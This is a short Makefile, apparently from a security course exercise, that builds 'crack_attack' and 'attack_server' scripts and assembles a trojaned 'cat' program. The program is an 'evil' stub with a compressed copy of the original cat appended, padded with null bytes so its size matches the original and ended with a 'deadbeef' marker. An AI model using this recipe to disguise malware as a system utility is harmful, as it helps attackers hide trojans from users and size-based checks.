CRACK  = crack_attack
SERVER = attack_server

CRACK_FILE  = crack_attack.py
SERVER_FILE = attack_server.py

CAT  = cat
XZ   = cat.xz
ORIG = cat.orig
EVIL = cat.evil

all: $(CRACK) $(SERVER)

$(CRACK): $(CRACK_FILE)
	cp $< $@ && chmod +x $@
	cat $(ORIG) | xz > $(XZ)
	cat $(EVIL) \
		| perl -pe "s/SIZE1/$$(cat $(EVIL) | wc -c | tr -d ' ')/" \
		| perl -pe "s/SIZE2/$$(cat $(XZ)   | wc -c | tr -d ' ')/" \
		> $(CAT)
	cat $(XZ) >> $(CAT)
	perl -e "print(\"\x00\" x $$(($$(cat $(ORIG) | wc -c) - $$(cat $(CAT) | wc -c) - 8)))" >> $(CAT)
	perl -e "print(\"\x64\x65\x61\x64\x62\x65\x61\x66\")" >> $(CAT)
	chmod +x $(CAT) && rm $(XZ)

$(SERVER): $(SERVER_FILE)
	cp $< $@ && chmod +x $@

clean:
	rm $(CRACK) $(SERVER) $(CAT)
